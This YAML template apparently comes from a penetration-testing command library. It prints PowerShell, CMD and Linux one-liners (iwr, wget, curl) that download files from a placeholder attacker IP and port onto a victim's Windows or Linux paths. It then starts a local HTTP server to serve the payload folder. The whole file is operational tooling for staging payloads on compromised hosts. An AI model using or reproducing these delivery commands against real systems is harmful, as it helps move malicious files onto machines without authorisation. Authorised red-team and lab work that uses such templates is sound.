metadata:
  filename: deliver-universal-transfer-outbound.yaml
  tags:
  - web
  created: '2025-03-29'
  author: Unknown
content: "mkdir -p packstation/outbound; \\\necho '================================================================';\
  \ \\\necho '                      -----PowerShell-----                      '; \\\
  \necho 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE\
  \ -Outfile {{ delivery_path_windows }}\\FILE'; \\\necho '================================================================';\
  \ \\\necho '                         -----CMD-----                          '; \\\
  \necho 'Deliver: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
  \ }}/FILE -Outfile {{ delivery_path_windows }}\\FILE'; \\\necho '================================================================';\
  \ \\\necho '                       -----Linux------                         '; \\\
  \necho 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/FILE\
  \ -o {{ delivery_path_linux }}/FILE'; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
